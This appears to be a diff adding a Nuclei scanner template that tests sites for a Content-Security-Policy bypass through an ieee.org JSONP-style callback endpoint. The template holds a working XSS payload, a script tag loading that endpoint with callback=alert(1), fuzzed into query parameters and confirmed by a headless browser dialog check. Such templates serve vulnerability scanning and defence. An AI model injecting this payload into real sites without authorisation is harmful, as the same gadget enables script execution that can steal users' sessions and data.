@@ -1,0 +1,55 @@
+id: ieee-oamssoqae-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass via IEEE OAMSsoQAE
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,ieee-oamssoqae
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "ieee.org"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: ieee_oamssoqae_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://oamssoqae.ieee.org/ieeevendorsso/ssocookievalidator?callback=alert(1)-"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "ieee_oamssoqae_csp_xss == true"
+# digest: 4a0a00473045022100a27e3fa858fe1903dabd6b3dc3cdef45b7077f2de5e8a7144175e82cf8a94fac02200a973f32b97cc97aaa6d04b0e383a723bec42f6f5f0271ba40301a5c73a24752:922c64590222798bb761d5b6d8e72950
